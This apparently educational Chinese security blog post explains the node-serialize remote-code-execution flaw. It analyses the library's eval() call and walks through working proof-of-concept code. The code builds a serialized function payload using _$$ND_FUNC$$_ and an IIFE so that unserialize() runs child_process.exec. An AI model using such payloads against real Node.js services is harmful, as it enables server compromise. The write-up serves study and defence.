<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> node-serialize反序列化漏洞 · Mi1k7ea</title><meta name="description" content="node-serialize反序列化漏洞 - Mi1k7ea"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/1.jpg"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://www.mi1k7ea.com/atom.xml" title="Mi1k7ea"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/1.jpg" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">MI1K7EA</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">归档</a></li><li class="nav-list-item"><a href="/tags/" target="_self" class="nav-list-link">分类</a></li><li class="nav-list-item"><a href="/about/" target="_self" class="nav-list-link">关于</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">node-serialize反序列化漏洞</h1><div class="post-info">2020年3月29日</div><div class="post-content"><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Node.js在node-serialize模块中存在反序列化漏洞，若unserialize()函数参数外部可控，则通过IIFE（Immediately Invoked Function Expression）可以实现RCE。</p>
<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>需要安装node-serialize模块：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install node-serialize</span><br></pre></td></tr></table></figure>
<h2 id="0x03-序列化"><a href="#0x03-序列化" class="headerlink" title="0x03 序列化"></a>0x03 序列化</h2><p>序列化代码如下，serialize.js：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> y = &#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Serialized:\n"</span> + s.serialize(y));</span><br></pre></td></tr></table></figure>
<p>变量y是一段payload，用于启动一个子线程来执行calc命令，这里输出序列化后的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;node serialize.js</span><br><span class="line">Serialized:</span><br><span class="line">&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\r\n\t\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x04-IIFE"><a href="#0x04-IIFE" class="headerlink" title="0x04 IIFE"></a>0x04 IIFE</h2><p>前面得到了序列化的字符串之后，就可以用unserialize()函数进行反序列化了。那么问题来了，怎么代码执行呢？这就用到了JavaScript的IIFE了。</p>
<p>IIFE（Immediately Invoked Function Expression）立即调用的函数表达式，即声明函数的同时立即调用该函数，目的是为了隔离作用域，防止污染全局命名空间。</p>
<p>IIFE一般有如下两种写法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123; /* code /* &#125;());</span><br><span class="line">(function()&#123; /* code /* &#125;)();</span><br></pre></td></tr></table></figure>
<p>有时，我们需要在定义函数之后，立即调用该函数。此时，你不能再函数的定义之后加上圆括号，这是因为会产生语法错误，错误原因是function这个关键字既可以当作语句，也可以当作表达式。为了避免其余，规定function关键字出现在行首时，解释为语句。因此，若是以function开头的代码则必须像前面一样的写法才能成功在定义时被当作表达式执行。</p>
<p>写下Demo试下，下面两种形式都能成功弹计算器：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;());</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p><img src="/2020/03/29/node-serialize反序列化漏洞/1.png" alt=""></p>
<p>在前面序列化的代码serialize.js中，要想在序列化时直接执行该函数，可以将代码修改如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> y = &#123;</span><br><span class="line">	poc : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">	&#125;()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Serialized:\n"</span> + s.serialize(y));</span><br></pre></td></tr></table></figure>
<p><img src="/2020/03/29/node-serialize反序列化漏洞/2.png" alt=""></p>
<h2 id="0x05-反序列化触发RCE"><a href="#0x05-反序列化触发RCE" class="headerlink" title="0x05 反序列化触发RCE"></a>0x05 反序列化触发RCE</h2><p>前面序列化得到如下内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\r\n\t\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>在此基础上，为了在服务端进行反序列化操作的时候能触发RCE，我们直接在函数定义的后面追加<code>()</code>来构造即可（为啥能这么构造后面会说到）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\r\n\t\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>反序列化代码如下，unserialize.js：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">'&#123;"function":"_$$ND_FUNC$$_function()&#123;\\r\\n\\t\\trequire(\'child_process\').exec(\'calc\', function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\\r\\n\\t&#125;()"&#125;'</span></span><br><span class="line"></span><br><span class="line">s.unserialize(payload);</span><br></pre></td></tr></table></figure>
<p>运行即可触发RCE弹计算器：</p>
<p><img src="/2020/03/29/node-serialize反序列化漏洞/3.png" alt=""></p>
<h2 id="0x06-漏洞分析"><a href="#0x06-漏洞分析" class="headerlink" title="0x06 漏洞分析"></a>0x06 漏洞分析</h2><p>我们看源码，位于NodeJS\node_modules\node-serialize\lib\serialize.js，其中反序列化相关的代码如下：</p>
<p><img src="/2020/03/29/node-serialize反序列化漏洞/4.png" alt=""></p>
<p>这里当解析到将要反序列化的内容中的键值为string类型时，判断是否包含FUNCFLAG变量值即<code>_$$ND_FUNC$$_</code>，在前面的代码中有定义，该值表明其中的内容是个函数：</p>
<p><img src="/2020/03/29/node-serialize反序列化漏洞/5.png" alt=""></p>
<p>回到前面的if判断条件中往下走，若是则调用76行中的eval()方法来执行其中的语句。同时，由于JS的IIFE，使得刚刚定义的恶意函数就能够马上得以执行，从而RCE。</p>
<p>有个疑问，为啥这里不需要向前面IIFE小节中说的给function定义加<code>()</code>使其不是function开头呢？我们看到eval()那行代码：</p>
<p><img src="/2020/03/29/node-serialize反序列化漏洞/6.png" alt=""></p>
<p>明显看到，它已经给我们的整个的function给加上了括号括起来，我们只需要在函数定义后面加上<code>()</code>即可满足IIFE的其中一种格式，从而成功RCE。</p>
<h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://paper.seebug.org/213/" target="_blank" rel="noopener">利用 Node.js 反序列化漏洞远程执行代码</a></p>
</div></article></div></main><footer><div class="paginator"><a href="/2020/04/01/Tomcat-URL解析差异性及利用/" class="prev">上一篇</a><a href="/2020/03/29/浅析Node-js安全/" class="next">下一篇</a></div><div class="copyright"><p>© 2019 - 2020 <a href="https://www.mi1k7ea.com">Mi1k7ea</a>  |  <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span> </span>  |  <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span> 次</span></p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></body></html>